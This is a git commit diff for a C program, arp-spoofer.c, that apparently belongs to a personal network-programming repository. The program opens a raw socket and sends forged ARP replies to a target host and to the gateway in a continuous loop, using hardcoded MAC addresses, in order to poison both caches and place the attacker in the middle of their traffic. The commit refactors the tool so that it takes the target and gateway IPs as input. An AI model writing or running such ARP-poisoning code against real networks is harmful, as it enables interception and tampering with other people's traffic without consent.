d12f824bc9e4cdacb2aa9ee9ae9cdf0253eb0ab1
zevuxo1 <155918223+zevuxo1@users.noreply.github.com>
2024-09-14 05:01:44 +1000

    Update arp-spoofer.c

--- Network-Programming/arp-spoofer-sniffer/arp-spoofer.c
+++ Network-Programming/arp-spoofer-sniffer/arp-spoofer.c
@@ -1,32 +1,8 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <unistd.h>
-#include <netinet/ip.h>
-#include <linux/if_ether.h>
-#include <sys/ioctl.h>
-#include <linux/if.h>
-#include <net/ethernet.h>
-#include <signal.h>
-#include <netpacket/packet.h>
-#include <linux/tcp.h>
-#include <errno.h>
+#include "header.h"
 
-#define PACKET_SIZE 43
-#define ARP_PROTOCOL 0x0806 
-#define IPv4_PROTOCOL 0x0800
-#define HARDWARE_LENGTH 6
-#define PROTOCOL_LENGTH 4
 
-#define info(x, ...) printf("[+] " x "\n", ##__VA_ARGS__)
-#define okay(x, ...) printf("[*] " x "\n", ##__VA_ARGS__)
-#define error(x, ...) printf("[-] " x "\n", ##__VA_ARGS__)
-
-unsigned char target_ip[PROTOCOL_LENGTH] = {192, 168, 1, 23};
-unsigned char gateway_ip[PROTOCOL_LENGTH] = {192, 168, 1, 1};
+unsigned char target_ip[PROTOCOL_LENGTH];
+unsigned char gateway_ip[PROTOCOL_LENGTH];
 unsigned char my_ip[PROTOCOL_LENGTH] = {192, 168, 1 , 31};
 
 unsigned char my_mac[HARDWARE_LENGTH] = {0x00, 0x0c, 0x29, 0xd9, 0x94, 0x21};
@@ -34,22 +10,8 @@ unsigned char target_mac[HARDWARE_LENGTH] = {0xD0, 0x39, 0x57, 0xE3, 0x80, 0xA9}
 unsigned char router_mac[HARDWARE_LENGTH] = {0xd0, 0xdb, 0xb7, 0x94, 0xd2, 0x3a};
 unsigned char test[HARDWARE_LENGTH]       = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
-void spoof_target(int socketFD) {
+int sockfd;
 
-}
-
-// Struct for ARP Reply,Read Below For what each Entry mEans
-struct arphdr {
-    uint16_t hw_type;         
-    uint16_t proto_type;      
-    uint8_t hw_len;            
-    uint8_t proto_len;        
-    uint16_t op;               
-    uint8_t sender_hw_addr[HARDWARE_LENGTH]; 
-    uint8_t sender_proto_addr[PROTOCOL_LENGTH]; 
-    uint8_t target_hw_addr[HARDWARE_LENGTH]; 
-    uint8_t target_proto_addr[PROTOCOL_LENGTH]; 
-};
 
 /*
 ARP REPLY PACKET STRUCTURE
@@ -66,7 +28,7 @@ Layer 3
 		if we are making the router think we are the target this will be set to My MAC Address
 Layer 4
 	Sender-Protocol-Address:   32 bits --> IP Of the Sender
-		if we are making the router think we are the target this will be set to My IP
+		if we are making the router think we are the target this will be set to Routers IP
 Layer 5
 	Target-Hardware-Address:   48 bits --> MAC Address Of the Target
 Layer 6
@@ -75,8 +37,10 @@ Layer 6
 */
 
 void sig_handle(int sig) {
-	printf("[*] Ctrl+C Detected, GoodBye");
-	exit(1);
+	system("clear && clear");
+	close(sockfd);
+	main();
+	
 }
 
 void create_target_packet(unsigned char* buffer) {
@@ -90,19 +54,16 @@ void create_target_packet(unsigned char* buffer) {
 			Protocol This Packet is Using(0x0806 to tell ARP)
 	**/
 
-	info("Creating Ethernet Header");
 	memcpy(ether_header->h_dest, target_mac, 6);
 	memcpy(ether_header->h_source, my_mac, 6);
 	ether_header->h_proto = htons(ARP_PROTOCOL);
 
-	okay("Ethernet Header Created!\n");
 
 
 	/**
 		Finally We Create the ARP Reply Packet
 	**/
 
-	info("Creating ARP Reply Payload...");
 	arp_header->hw_type = htons(1);
 	arp_header->proto_type = htons(IPv4_PROTOCOL);
 	arp_header->hw_len = 6;
@@ -112,7 +73,6 @@ void create_target_packet(unsigned char* buffer) {
 	memcpy(arp_header->sender_proto_addr, gateway_ip, 4);
 	memcpy(arp_header->target_hw_addr, target_mac, 6);
 	memcpy(arp_header->target_proto_addr, target_ip, 4);
-	okay("Forged ARP Reply Created!\n[+] Sending Packet Now\n");
 
 
 }
@@ -137,8 +97,15 @@ void create_router_packet(unsigned char* packet) {
 
 }
 
-int main(int argc, char *argv[])
+int entry(char* ip, char* gateway)
 {
+	if((inet_pton(AF_INET, gateway, gateway_ip)) <= 0) {
+		printf("fail");
+	}
+
+	if((inet_pton(AF_INET, ip, target_ip)) <= 0) {
+		printf("fail");
+	}
 	signal(SIGINT, sig_handle);
 	/** 
 		Buffer1 Holds the Packet that will Be Sent to the target and make it think we are the router
@@ -148,7 +115,6 @@ int main(int argc, char *argv[])
 	unsigned char buffer2[ETH_HLEN + sizeof(struct arphdr)];
 	
 
-	int sockfd;
 	
 	//struct sockaddr_ll is Used for link layer raw sockets, we can specify the interface and Dest MAC
 	struct sockaddr_ll sa;
@@ -158,16 +124,14 @@ int main(int argc, char *argv[])
 	//struct ifreq is used for managing network interfaces, allows us to query, configure ect
 	struct ifreq ifr;
 	
-	printf("[+] Creating Socket...\n");
+
 
 	// Create a Raw socket, tell the kernel we want it to do 0 processeIng on the Packets, so we can create the Headers
 	
 	if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
 		printf("Error: %s\n", strerror(errno));
 		printf("[*] Did You Run As Root?");
-		return 1;
 	}
-	printf("[*] Raw Socket Created: %d\n\n", sockfd);
 
 	/**
 		Copy the interface we want to send on to the ifreq struct
@@ -176,10 +140,8 @@ int main(int argc, char *argv[])
 	strcpy(ifr.ifr_name, "eth0");
 	if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
 		printf("Error: %s\n", strerror(errno));
-		return 1;
 	}
 
-	printf("[*] Interface: %d\n", ifr.ifr_ifindex);
 	
 
 	/** 
@@ -191,10 +153,12 @@ int main(int argc, char *argv[])
 	sa.sll_ifindex = ifr.ifr_ifindex;
 	sa.sll_family = AF_PACKET;
 
+	memset(&sa2, 0, sizeof(sa2));
 	sa2.sll_ifindex = ifr.ifr_ifindex;
 	sa2.sll_family = AF_PACKET;
 
-	printf("[+] Creating Packet To Send to Target...\n");
+
+
 	create_target_packet(buffer1);
 	create_router_packet(buffer2);
 
@@ -206,13 +170,11 @@ int main(int argc, char *argv[])
 	int x = 1;
 	while(1) {
 		printf("\r[*] Sent %d Packets", x);
-		// Send Forged ARP Reply to target
 		if(sendto(sockfd, buffer1, sizeof(buffer1), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
 			printf("[-] Error: %s\n", strerror(errno));
 			break;
 		}
 
-		// Send Forged ARP Reply too Router
 		if(sendto(sockfd, buffer2, sizeof(buffer2), 0, (struct sockaddr*)&sa2, sizeof(sa2)) < 0) {
 			printf("[-] Error: %s\n", strerror(errno));
 			break;
@@ -223,9 +185,6 @@ int main(int argc, char *argv[])
 	}
 	
 
-	close(sockfd);
 
 
-
-	return 0;
 }
